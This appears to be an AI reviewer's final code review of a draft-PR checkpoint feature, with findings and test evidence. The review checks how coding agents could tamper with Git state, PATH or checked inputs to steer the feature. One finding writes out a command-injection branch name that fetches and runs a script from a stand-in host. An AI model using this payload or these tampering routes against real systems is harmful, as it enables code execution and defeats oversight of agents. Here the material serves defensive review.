APPROVE WITH CHANGES

Reviewer: Claude Fable 5.1 (same provider as the author; cross-provider Codex unavailable: usage limit). Round 4: final confirmation and spec reconciliation, read-only on committed HEAD of `feat-github-draft-pr` (`dd32395`). Ran `tests.test_draft_pr` (76 OK), `tests.test_spec_workflow.DraftPrRunTests` (7 OK), `tests.test_agent_run_ledger` (64 OK), `ruff check` and `ruff format --check` (clean). Verified live: PR #33 is open with head `feat-github-draft-pr`, base `main`, ready (operator step 4); Issue #34 is open. The approved spec digest in `intent.md` matches `spec.md` (`sha256:411ff5a2…`).

## Round-3 findings and reconciliation gaps

| Item | Status | Evidence |
| --- | --- | --- |
| R3 branch steering at start (HEAD) | accepted residual, DEC-0012 (a) | `run.py:159-166` prints `Draft PR: branch pinned: <branch>` before the engine; `DraftPrRunTests.test_start_pins_the_branch_before_the_engine_and_resume_never_does`. Launcher-wide boundary in #34. |
| R3 head repository | RESOLVED | `draft_pr.py:895` checks `head.repo.full_name`; `CreationTests.test_pr_from_another_repository_of_the_same_owner_is_ignored`. |
| R3 concurrent body edit | accepted residual, DEC-0007 | re-read at `draft_pr.py:714-723`; `ReuseTests.test_body_edited_during_the_check_is_left_alone`, `test_edit_rereads_the_pr_right_before_writing`. |
| R3 meaningful diff / 300-file cap | RESOLVED, DEC-0008 superseded | one response, `>= COMPARE_FILE_CAP` never concluded, `draft_pr.py:764-769`; `PendingTests.test_capped_spec_only_list_is_unclassified`. |
| R3 `-I -S` | RESOLVED | `launcher.py:65` `COMMANDS["run"] == ("-IS", "run.py")` (PR #31 is an ancestor). |
| R3 live qualification (T038) | RESOLVED | `tasks.md:142` records steps 1-8 and the spec-only step 2; PR #33 verified live; direct checkpoint invocation disclosed, `run.py` path covered by `DraftPrRunTests`. |
| R3 executable `PATH` boundary | accepted, DEC-0012 (b) | `ledger.py:359-394` drops working trees and temp roots; `CommandSeamTests.test_path_entries_in_agent_writable_temp_roots_are_dropped`, `test_default_temp_roots_cover_tmp_and_tmpdir`. Rest in #34. |
| R3 agent-writable state dir | RESOLVED | `draft_pr.py:278-288` refuses a pin path under the checkout or a temp root; `IdentityTests.test_pin_in_agent_writable_state_is_never_trusted`, `test_branch_pin_lives_outside_the_checkout`. |
| R3 malformed compare read as empty | RESOLVED | `draft_pr.py:752-756`; `PendingTests.test_malformed_compare_is_retryable_not_empty`. |
| Reconciliation gap 1 (initial branch authority) | accepted residual | DEC-0012 (a), as above. |
| Gap 2 (state dir, PATH) | RESOLVED / accepted | `_pin_path` above; PATH per DEC-0012 (b). |
| Gap 3 (malformed successful responses) | RESOLVED | `draft_pr.py:627-632` (`pages`: list and comments must be a list of pages) and `:752-756`; `PendingTests.test_malformed_list_is_retryable_never_empty`, `test_malformed_compare_is_retryable_not_empty`; both assert no write. |
| Gap 4 (accepted-decision drift) | PARTIAL | `spec.md:82` and FR-003 amended, intent re-approved with matching digest. Still stale: `plan.md:11` ("It never reads agent-written text"), `plan.md:15` (`python3 -I`), `draft_pr.py:11` (same claim). |
| Gap 5 (qualification incomplete) | RESOLVED | T038 step 2 recorded (`tasks.md:142`); T039/T040 are this round. |

Also checked and not a finding: the checkpoint's feature source `.specify/workflows/runs/<run>/inputs.json` is hashed by the agent wrapper around every agent step (`agent.py:73-76` `SPECIFY_WRITABLE` excludes `workflows/runs`, `agent.py:177-191`), so an agent edit raises `BALLAST_TAMPERED` and the checkpoint skips (`draft_pr.py:350-355, 488-490`).

## Findings

| Severity | Label | File:line | Required action |
| --- | --- | --- | --- |
| Medium | implementation bug (security hygiene) | `draft_pr.py:547-551`, `:588-592`, `:745-750` | `remote` and `branch` from agent-writable Git state are formatted unquoted into the pasteable remedy `publish the branch, e.g. git push -u {remote} {branch}`. Git accepts `; \| $ ( ) { }` in refnames (`git check-ref-format --branch 'x;curl${IFS}evil.sh\|sh'` is valid). Reproduced on this HEAD: a run on that branch with no upstream prints `Draft PR: pending (not-published): publish the branch, e.g. git push -u origin x;curl${IFS}evil.sh\|sh`. The `:547` path runs before the pin check, so it prints the current HEAD name, not the pinned one. `spec.md:85` says untrusted text is never passed to a shell; this hands it to the operator's shell by suggestion. Fix before merge: `shlex.quote()` the `fill` values in `_outcome` (one line), or validate `remote`/`branch` against `[A-Za-z0-9._/-]+` and print `<branch>` otherwise; add one test with a metachar branch name asserting the remedy is shell-safe. |
| Low | spec ambiguity | `spec.md:86` vs `data-model.md:65`, DEC-0003 | Edge case says "restores at most the Issue link"; accepted DEC-0003 appends the whole marked section when the body has no Issue reference (`draft_pr.py:697-700`). Align the spec wording with DEC-0003 (no code change). |
| Low | architecture issue (documentation) | `plan.md:11`, `plan.md:15`, `draft_pr.py:11` | Reconciliation gap 4 asked for these corrections; they remain. Say `.git/config` is agent-writable and pinned (DEC-0005/0006/0010), and `python3 -I -S`. |
| Info | none | `draft_pr.py:793` | The PR lock lives in the agent-writable Git common dir; an agent can defeat exclusion, but GitHub's one-open-PR-per-head/base rule plus the `already exists` -> `settle()` path (`:816-819`, `ConcurrencyTests.test_pr_created_by_another_clone_is_reused`) still yields at most one PR. No action; note in #34 if desired. |

No critical or high finding. I looked specifically for: agent steering of `gh` target (repository pinned in protected `ballast.toml` at `:324-343, 594-605`; branch pinned in operator state at `:278-321, 581-592`; every `gh` call names `--repo` or the repo path and starts in an empty temp dir at `:460-466`), credential leakage (`Result` never printed or stored; ledger gets only validated `label`/`int`/`url` fields, `ledger.py:305-312, 463`; `LeakageTests` x3), false "no PR needed" conclusions (compare 404 -> `not-published`, unreadable compare/list -> `github-error`, template 404 -> empty template only; `decide` returns `None` only for an empty validated list), and duplicate creation (re-settle under lock `:796`, `already exists` fallback, `verify` requires exactly one open draft on the base `:831`). All hold.

## AC/FR evidence map

| Criterion | Code | Tests |
| --- | --- | --- |
| AC-001, FR-006, FR-016 | `draft_pr.py:431-448` (section, `Related to`, escaped scope), `:497`, `:771-821` | `CreationTests.test_meaningful_change_without_pr_creates_one_draft`, `test_long_issue_title_is_truncated`; `BodyTests.test_base_branch_template_precedes_the_section`, `test_missing_template_leaves_only_the_section`, `test_intake_scope_lines_are_copied`, `test_newest_member_intake_comment_wins_across_pages`, `test_intake_comment_from_non_member_is_ignored`, `test_hostile_scope_text_is_escaped` |
| AC-002, FR-010 | `draft_pr.py:968-977`; `ledger.py:50-95, 305-312, 535-542, 1788-1793` | `LedgerReportTests.test_report_shows_latest_pull_request_outcome`; `test_agent_run_ledger` pull_request validation; `DraftPrRunTests.test_paused_run_still_records_its_checkpoint` |
| AC-003 | `draft_pr.py:527-551`, `:578-579`, `:745-750` | `IdentityTests.test_detached_head_is_pending_no_branch`, `test_branch_without_upstream_is_not_published`, `test_published_branch_equal_to_default_branch_is_pending`; `PendingTests.test_head_missing_on_github_is_not_published` |
| AC-004, AC-005, FR-003 | `draft_pr.py:738-769` | `PendingTests.test_spec_only_or_empty_differences_are_not_meaningful`, `test_paths_outside_the_exact_spec_prefix_are_meaningful`, `test_capped_spec_only_list_is_unclassified`, `test_malformed_compare_is_retryable_not_empty` |
| FR-004 | no push/fetch anywhere; ADR-0003 allowlist | `IdentityTests.test_git_commands_only_read` |
| AC-006, FR-005 | `draft_pr.py:500-505`, `:634-690`, `:692-736` | `ReuseTests.test_canonical_section_is_reused_without_edit`, `test_stale_section_is_rewritten_and_nothing_else`, `test_hand_opened_pr_is_adopted_before_the_diff_check`, `test_open_pr_against_another_base_blocks` |
| AC-007, FR-007 | `draft_pr.py:696-723` | `ReuseTests.test_hand_opened_pr_without_reference_gets_the_section`, `test_hand_opened_pr_already_referencing_the_issue_is_untouched`, `test_several_or_unbalanced_sections_are_left_alone`, `test_body_edited_during_the_check_is_left_alone`, `test_edit_rereads_the_pr_right_before_writing`, `test_failed_reread_is_retryable_and_writes_nothing` |
| AC-008, FR-008 | `draft_pr.py:724-733` (edit passes only `--body-file`) | `ReuseTests.test_ready_pr_is_never_turned_back_into_a_draft` |
| AC-009, FR-009 | `draft_pr.py:790-821`, `:927-965` | `ConcurrencyTests.test_two_concurrent_checkpoints_create_one_pr`, `test_pr_created_by_another_clone_is_reused`, `test_created_pr_that_does_not_match_the_request_is_unverified`, `test_lock_held_elsewhere_is_busy`, `test_symlinked_lock_is_refused` |
| AC-010, FR-002, FR-011 | `draft_pr.py:376-390`, `:476-482`, `:980-997`; `run.py:167-220` | `RetryableFailureTests.test_each_stage_and_failure_is_retryable_with_its_remedy`; `ProgramResolutionTests.test_missing_gh_reports_install_remedy`; `DraftPrRunTests.test_raising_checkpoint_never_changes_the_exit_status`, `test_checkpoint_runs_once_after_import_for_start_and_resume`, `test_failing_pin_never_stops_the_start` |
| AC-011 | `draft_pr.py:652-660` | `BlockedOutcomeTests.test_two_open_prs_are_ambiguous` |
| AC-012 | `draft_pr.py:678-689` | `BlockedOutcomeTests.test_closed_or_merged_pr_blocks`, `test_closed_pr_on_a_later_page_is_found` |
| AC-013, FR-012 | `draft_pr.py:512-522`, `:607-616` | `IdentityTests.test_feature_without_issue_number_is_unlinked_before_any_command`, `test_missing_issue_or_pull_request_number_is_unlinked`, `test_resume_reads_feature_from_run_inputs` |
| AC-014, FR-013 | `Result` never printed; `format_line :404-417`; `_record :968-977`; `checkpoint :987-991` (type name only) | `LeakageTests.test_no_credential_reaches_output_or_ledger`, `test_internal_error_prints_only_the_exception_type`, `test_hostile_issue_title_is_one_verbatim_argument` |
| FR-001, SC-005, BL-INV-002/003 | `run.py:148-158` (token strip), `:46-55`; `draft_pr.py:231-275` (`_command`, child PATH), `:358-360`, `:460-466`, `:488-490` | `DraftPrRunTests.test_engine_never_receives_github_tokens_but_checkpoint_does`, `test_agents_are_still_denied_push_and_gh`; `ProgramResolutionTests` (4); `CommandSeamTests.test_command_passes_tokens_and_gh_settings_without_shell`, `test_child_path_keeps_only_entries_outside_working_trees`, `test_path_entries_in_agent_writable_temp_roots_are_dropped`, `test_gh_never_reads_the_checkouts_git_config`, `test_timeout_is_reported_not_raised`; `test_tamper_or_in_progress_marker_skips_without_command_or_event` |
| DEC-0005/0006/0010/0012 pins | `draft_pr.py:278-321`, `:324-343`, `:581-605`; `run.py:159-166` | `IdentityTests.test_missing_or_invalid_pinned_repository_is_unlinked`, `test_remote_redirected_away_from_pinned_repository_is_refused`, `test_pinned_repository_matches_case_insensitively`, `test_run_without_a_branch_pin_is_unlinked`, `test_branch_switched_after_start_is_refused`, `test_upstream_redirected_after_start_is_refused`, `test_upstream_under_another_name_is_refused`, `test_pin_in_agent_writable_state_is_never_trusted`, `test_branch_pin_lives_outside_the_checkout`; `DraftPrRunTests.test_start_pins_the_branch_before_the_engine_and_resume_never_does` |
| FR-014, SC-003 | all twelve situations named above | 76 tests pass offline |
| FR-015 | `templates/policies/spec-kit-workflow.md:516` (every reason code present), `README.md` paragraph, `docs/adr/0003` | documentation review: consistent with the implemented boundary |

Reconciliation: PARTIAL

Spec, implementation and tests converge on every AC and FR; the two remaining items are the Medium remedy-quoting fix (small code change plus one test) and the stale `plan.md:11,15` / `draft_pr.py:11` wording from gap 4. Once both land, this reads as CONVERGED; ADR-0003 can go to the operator for acceptance with the DEC-0012 residuals stated as they are.
